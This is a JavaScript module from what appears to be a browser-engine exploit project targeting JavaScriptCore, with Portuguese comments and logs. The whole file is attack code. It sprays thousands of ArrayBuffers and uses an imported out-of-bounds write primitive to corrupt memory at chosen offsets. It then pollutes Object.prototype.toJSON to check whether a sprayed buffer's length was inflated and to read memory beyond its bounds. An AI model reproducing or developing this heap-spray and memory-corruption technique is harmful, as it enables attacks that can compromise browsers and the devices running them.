// js/script3/testAggressiveHeapSpray.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// toJSON que sonda 'this' (ArrayBuffer) e tenta R/W OOB se o tamanho estiver inflado
export function toJSON_AttemptWriteToThis_v3() {
    let initial_buffer_size_for_oob_check;
    const original_sprayed_ab_size = 64; 

    if (typeof oob_array_buffer_real !== 'undefined' && this === oob_array_buffer_real) {
        initial_buffer_size_for_oob_check = OOB_CONFIG.BASE_OFFSET_IN_DV + OOB_CONFIG.ALLOCATION_SIZE + 128;
    } else {
        initial_buffer_size_for_oob_check = original_sprayed_ab_size;
    }

    let result_payload = {
        toJSON_executed: "toJSON_AttemptWriteToThis_v3",
        this_type: Object.prototype.toString.call(this),
        is_array_buffer_instance: this instanceof ArrayBuffer,
        byteLength_prop: "N/A",
        dataview_created: false,
        internal_write_val: null,
        internal_read_val: null,
        internal_rw_match: false,
        error_in_toJSON: null,
        oob_read_offset_attempted: "N/A",
        oob_read_value_attempted: "N/A"
    };

    try {
        if (!result_payload.is_array_buffer_instance) {
            result_payload.error_in_toJSON = "this is not an ArrayBuffer instance at entry.";
            return result_payload;
        }
        result_payload.byteLength_prop = this.byteLength;

        if (this.byteLength >= 4) {
            try {
                const dv_internal = new DataView(this, 0, Math.min(this.byteLength, 8));
                result_payload.dataview_created = true;
                const val_to_write_internal = 0xABABABAB;
                dv_internal.setUint32(0, val_to_write_internal, true);
                result_payload.internal_write_val = toHex(val_to_write_internal);
                const read_back_internal = dv_internal.getUint32(0, true);
                result_payload.internal_read_val = toHex(read_back_internal);
                if (read_back_internal === val_to_write_internal) {
                    result_payload.internal_rw_match = true;
                }
            } catch (e_dv_internal) {
                result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `Internal DV RW Error: ${e_dv_internal.name}; `;
                result_payload.dataview_created = false;
            }
        } else {
            result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `this (AB) too small for internal RW (size: ${this.byteLength}); `;
        }

        if (typeof result_payload.byteLength_prop === 'number' && result_payload.byteLength_prop > initial_buffer_size_for_oob_check) {
            const oob_read_target_offset = initial_buffer_size_for_oob_check + 4;
            result_payload.oob_read_offset_attempted = toHex(oob_read_target_offset);
            if (this.byteLength >= oob_read_target_offset + 4) {
                try {
                    const dv_oob = new DataView(this);
                    result_payload.oob_read_value_attempted = toHex(dv_oob.getUint32(oob_read_target_offset, true));
                } catch (e_oob_r) {
                    result_payload.oob_read_value_attempted = `OOB Read Error @${result_payload.oob_read_offset_attempted}: ${e_oob_r.name}`;
                }
            } else {
                 result_payload.oob_read_value_attempted = `Inflated size (${this.byteLength}b) too small for OOB read @${toHex(oob_read_target_offset)}.`;
            }
        } else {
             result_payload.oob_read_offset_attempted = toHex(initial_buffer_size_for_oob_check + 4);
             result_payload.oob_read_value_attempted = `Size not inflated (this: ${result_payload.byteLength_prop}b vs initial_expected: ${initial_buffer_size_for_oob_check}b).`;
        }
    } catch (e_main) {
        result_payload.error_in_toJSON = (result_payload.error_in_toJSON || "") + `GEN_ERR: ${e_main.name}: ${e_main.message}; `;
    }
    return result_payload;
}


export async function executeAggressiveHeapSprayAndCorruptTest() {
    const FNAME_TEST = "executeAggressiveHeapSprayAndCorruptTest";
    logS3(`--- Iniciando Teste: Spray Agressivo de AB, Corrupção OOB Múltipla, e Sondagem ---`, "test", FNAME_TEST);
    document.title = `AggroSpray & Corrupt AB`;

    const spray_count = 5000; 
    const victim_size = 64;
    const sprayed_victim_abs = [];

    const base_corruption_zone_start = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 32; 
    const corruption_offsets_to_try = [];
    for (let i = 0; i < 10; i++) { 
        corruption_offsets_to_try.push(base_corruption_zone_start + (i * 4));
    }
    if (!corruption_offsets_to_try.includes(112)) corruption_offsets_to_try.push(112);


    const value_to_write = 0xFFFFFFFF; 
    const bytes_to_write = 4;

    logS3(`1. Pulverizando ${spray_count} ArrayBuffers de ${victim_size} bytes cada...`, "info", FNAME_TEST);
    try {
        for (let i = 0; i < spray_count; i++) {
            sprayed_victim_abs.push(new ArrayBuffer(victim_size));
        }
        logS3(`   Pulverização de ${sprayed_victim_abs.length} ArrayBuffers concluída.`, "good", FNAME_TEST);
    } catch (e_spray) {
        logS3(`ERRO durante a pulverização do heap: ${e_spray.message}. Abortando teste.`, "error", FNAME_TEST);
        return;
    }

    await PAUSE_S3(MEDIUM_PAUSE_S3);

    const ppKey_val = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let any_corruption_found = false;

    const probe_step = Math.max(1, Math.floor(spray_count / 20)); 
    const max_probes = 50; 
    let probes_done = 0;

    for (let i = 0; i < sprayed_victim_abs.length && probes_done < max_probes; i += probe_step) {
        const current_victim_ab = sprayed_victim_abs[i];
        if (!current_victim_ab) continue;

        logS3(`\n--- Sondando sprayed_victim_abs[${i}] (ID conceitual: Victim-${i}) ---`, 'subtest', FNAME_TEST);

        for (const corruption_offset of corruption_offsets_to_try) {
            if (any_corruption_found) break; 

            document.title = `SprayAB - Probe ${i}, Offs ${toHex(corruption_offset)}`;
            logS3(`  Tentando corrupção em oob_ab[${toHex(corruption_offset)}] para Victim-${i}...`, "info", FNAME_TEST);

            await triggerOOB_primitive(); 
            if (!oob_array_buffer_real) {
                logS3("  Falha OOB Setup para esta tentativa. Pulando.", "error", FNAME_TEST);
                continue;
            }

            try {
                if (corruption_offset < 0 || corruption_offset + bytes_to_write > oob_array_buffer_real.byteLength) {
                    logS3(`  AVISO: Offset de corrupção ${toHex(corruption_offset)} fora dos limites de oob_array_buffer_real. Pulando.`, "warn", FNAME_TEST);
                    continue;
                }
                oob_write_absolute(corruption_offset, value_to_write, bytes_to_write);
            } catch (e_write) {
                logS3(`    ERRO na escrita OOB para offset ${toHex(corruption_offset)}: ${e_write.message}.`, "error", FNAME_TEST);
                clearOOBEnvironment(); 
                continue;
            }

            await PAUSE_S3(SHORT_PAUSE_S3); 

            let stringifyResult = null;
            pollutionApplied = false; 

            try {
                Object.defineProperty(Object.prototype, ppKey_val, {
                    value: toJSON_AttemptWriteToThis_v3,
                    writable: true, configurable: true, enumerable: false
                });
                pollutionApplied = true;

                stringifyResult = JSON.stringify(current_victim_ab); 

                if (stringifyResult && stringifyResult.toJSON_executed === "toJSON_AttemptWriteToThis_v3") {
                    if (stringifyResult.error_in_toJSON) {
                        logS3(`    toJSON (Victim-${i}, Corrupt@${toHex(corruption_offset)}) reportou erro: ${stringifyResult.error_in_toJSON}`, "warn", FNAME_TEST);
                    }
                    if (stringifyResult.is_array_buffer_instance && typeof stringifyResult.byteLength_prop === 'number' && stringifyResult.byteLength_prop !== victim_size) {
                        any_corruption_found = true;
                        logS3(`    !!!! ALTERAÇÃO DE TAMANHO DETECTADA em Victim-${i} !!!! (Corrupção em oob_ab[${toHex(corruption_offset)}])`, "critical", FNAME_TEST);
                        logS3(`       Original: ${victim_size}, Novo: ${stringifyResult.byteLength_prop}`, "critical", FNAME_TEST);
                        logS3(`       Detalhes da toJSON: ${JSON.stringify(stringifyResult)}`, "leak", FNAME_TEST);
                        document.title = `SUCCESS: Size Altered! V-${i} Off-${toHex(corruption_offset)}`;
                        break; 
                    }
                    if (stringifyResult.oob_read_value_attempted && !String(stringifyResult.oob_read_value_attempted).startsWith("Size not inflated")) {
                         any_corruption_found = true;
                         logS3(`    !!!! LEITURA OOB POTENCIAL em Victim-${i} !!!! (Corrupção em oob_ab[${toHex(corruption_offset)}])`, "critical", FNAME_TEST);
                         logS3(`       Detalhes: ${stringifyResult.oob_read_offset_attempted} -> ${stringifyResult.oob_read_value_attempted}`, "critical", FNAME_TEST);
                         logS3(`       Detalhes da toJSON: ${JSON.stringify(stringifyResult)}`, "leak", FNAME_TEST);
                         document.title = `SUCCESS: OOB Read! V-${i} Off-${toHex(corruption_offset)}`;
                         break;
                    }
                }

            } catch (e_str) {
                logS3(`    !!!! ERRO AO STRINGIFY Victim-${i} (Corrupção em oob_ab[${toHex(corruption_offset)}]) !!!!: ${e_str.name} - ${e_str.message}`, "error", FNAME_TEST);
            } finally {
                if (pollutionApplied) {
                    if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
                    else delete Object.prototype[ppKey_val];
                }
            }
            clearOOBEnvironment(); 
            if (any_corruption_found) break;
            await PAUSE_S3(10); 
        } 

        probes_done++;
        if (any_corruption_found) {
             logS3(`Corrupção encontrada, interrompendo sondagem de mais ArrayBuffers pulverizados.`, "warn", FNAME_TEST);
            break;
        }
        if (probes_done < max_probes && i + probe_step < sprayed_victim_abs.length) {
            await PAUSE_S3(50); 
        }
    } 

    if (!any_corruption_found) {
        logS3("Nenhuma corrupção óbvia (alteração de tamanho, leitura OOB) detectada nos ArrayBuffers pulverizados após múltiplas tentativas de corrupção.", "good", FNAME_TEST);
    }

    logS3(`--- Teste Spray Agressivo e Corrupção Múltipla CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment(); 
    sprayed_victim_abs.length = 0;
    globalThis.gc?.();
    document.title = any_corruption_found ? document.title : `AggroSpray Done (No Hits)`;
}
